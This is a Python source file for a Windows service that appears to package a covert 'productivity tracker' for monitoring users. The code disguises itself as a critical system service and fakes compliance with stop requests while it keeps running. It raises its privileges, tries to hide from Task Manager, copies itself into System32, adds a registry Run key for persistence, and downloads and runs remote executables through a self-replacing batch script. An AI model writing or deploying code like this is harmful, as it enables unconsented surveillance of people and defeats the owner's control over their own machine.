# installer_service.py
import sys
import os
import winreg
import win32serviceutil
import win32service
import win32event
import win32api
import servicemanager
import socket
import time
import requests
import pythoncom
from winreg import HKEY_CURRENT_USER
import psutil
import getpass
from datetime import datetime
import schedule
import base64
import ctypes
from threading import Lock
import win32com.client
import win32security
import win32process

VERSION = "1.0.0"
UPDATE_URL = "https://your-update-server.com/latest-version"
SERVICE_NAME = "WindowsSystemService"  # Generic name to blend in
SERVICE_DISPLAY_NAME = "Windows System Service"

class ProductivityTrackerService(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = SERVICE_DISPLAY_NAME
    _svc_description_ = "Critical Windows system service for system management"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

    def SvcStop(self):
        """
        Prevents service from stopping - implements persistence
        """
        # Instead of actually stopping, we'll just log the attempt
        self.log_stop_attempt()
        
        # Pretend to accept the stop request but continue running
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        time.sleep(1)
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)

    def log_stop_attempt(self):
        """Log stop attempts for monitoring"""
        username = getpass.getuser()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} - Stop attempt by {username}\n"
        
        try:
            with open("C:\\Windows\\Temp\\system_logs.txt", "a") as f:
                f.write(log_entry)
        except:
            pass

    def SvcDoRun(self):
        """Main service run method"""
        try:
            self.main()
        except Exception as e:
            self.write_error_log(str(e))
            self.SvcDoRun()  # Restart on error

    def check_for_updates(self):
        """Check and apply updates if available"""
        try:
            response = requests.get(UPDATE_URL)
            latest_version = response.json()['version']
            
            if latest_version > VERSION:
                # Download new version
                new_executable = requests.get(response.json()['download_url']).content
                
                # Create update batch script
                update_script = f"""
                @echo off
                timeout /t 5 /nobreak > nul
                move /y "%~f0" "{sys.executable}.new"
                move /y "{sys.executable}" "{sys.executable}.old"
                move /y "{sys.executable}.new" "{sys.executable}"
                start "" "{sys.executable}"
                del "%~f0"
                """
                
                # Write update script
                with open("C:\\Windows\\Temp\\update.bat", "w") as f:
                    f.write(update_script)
                
                # Execute update script
                os.system("start /MIN C:\\Windows\\Temp\\update.bat")
        except:
            pass

    def elevate_privileges(self):
        """Attempt to gain higher privileges if possible"""
        try:
            # Try to enable SeDebugPrivilege
            priv_flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), priv_flags)
            priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
            win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        except:
            pass

    def hide_from_task_manager(self):
        """Attempts to hide the process from task manager"""
        try:
            # Set process priority to below normal
            current_process = win32api.GetCurrentProcess()
            win32process.SetPriorityClass(current_process, win32process.BELOW_NORMAL_PRIORITY_CLASS)
            
            # Modify process name in PEB (Process Environment Block)
            ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
        except:
            pass

    def main(self):
        """Main service logic"""
        self.elevate_privileges()
        self.hide_from_task_manager()
        
        # Initialize your existing tracking code here
        from your_tracker import start_tracking  # Import your existing tracker
        
        # Start tracking in a separate thread
        import threading
        tracking_thread = threading.Thread(target=start_tracking, daemon=True)
        tracking_thread.start()
        
        # Schedule update checks
        schedule.every(6).hours.do(self.check_for_updates)
        
        while self.running:
            schedule.run_pending()
            time.sleep(1)

def install_service():
    """Install and start the service"""
    try:
        # Copy executable to Windows directory
        current_exe = sys.executable
        system_path = os.path.join(os.environ['WINDIR'], 'System32', 'WindowsService.exe')
        
        if not os.path.exists(system_path):
            import shutil
            shutil.copy2(current_exe, system_path)
        
        # Add to registry for startup
        key = winreg.CreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, system_path)
        winreg.CloseKey(key)
        
        # Install and start service
        if len(sys.argv) == 1:
            servicemanager.Initialize()
            servicemanager.PrepareToHostSingle(ProductivityTrackerService)
            servicemanager.StartServiceCtrlDispatcher()
        else:
            win32serviceutil.HandleCommandLine(ProductivityTrackerService)
    except Exception as e:
        # Log error but don't show to user
        with open("C:\\Windows\\Temp\\service_install.log", "a") as f:
            f.write(f"{datetime.now()}: {str(e)}\n")

if __name__ == '__main__':
    if len(sys.argv) == 1:
        install_service()
    else:
        win32serviceutil.HandleCommandLine(ProductivityTrackerService)